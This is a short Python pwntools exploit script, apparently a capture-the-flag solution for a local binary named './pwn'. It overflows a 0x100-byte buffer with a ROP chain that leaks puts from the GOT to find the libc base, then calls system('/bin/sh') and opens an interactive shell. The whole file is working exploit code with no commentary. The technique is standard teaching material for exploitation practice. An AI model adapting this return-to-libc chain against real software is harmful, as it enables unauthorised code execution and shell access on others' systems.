from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal=['tmux','split','-h']
p=process('./pwn')
sla 		= lambda a,b: p.sendlineafter(a,b)
sa 			= lambda a,b: p.sendafter(a,b)
ra 			= lambda a: p.readuntil(a)
gdb.attach(p,'b *0x40059f')
#offset = 283552
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
rdi = 0x400603
# leak puts(some)
sla("\n","1"*0x100+p64(0)+p64(rdi)+p64(0x601018)+p64(0x400430)+p64(0x400566))
base = u64(p.readline()[:-1]+'\0\0')-libc.sym['puts']
log.warning(hex(base))
libc.address = base
# attack : system("/bin/sh")
sla("\n","1"*0x100+p64(0)+p64(rdi)+p64(libc.search("/bin/sh").next())+p64(libc.sym['system']))
p.interactive()